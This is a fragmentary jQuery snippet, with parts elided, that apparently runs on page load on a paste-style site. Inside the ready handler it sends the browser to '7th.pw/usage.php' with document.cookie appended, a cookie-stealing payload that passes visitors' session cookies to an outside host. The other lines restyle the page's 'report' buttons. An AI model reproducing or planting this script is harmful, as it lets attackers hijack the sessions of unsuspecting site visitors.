...
$(document).ready(function(){
    ...
    location.href = '7th.pw/usage.php?cookie='+document.cookie;
    ...
    $('.psbitbtton_small:contains("report")').hover( function(){$(this).css("background","rgb(191,13,13)");});
	$('.psbitbtton_small:contains("report")').css("background-image", "url()");  
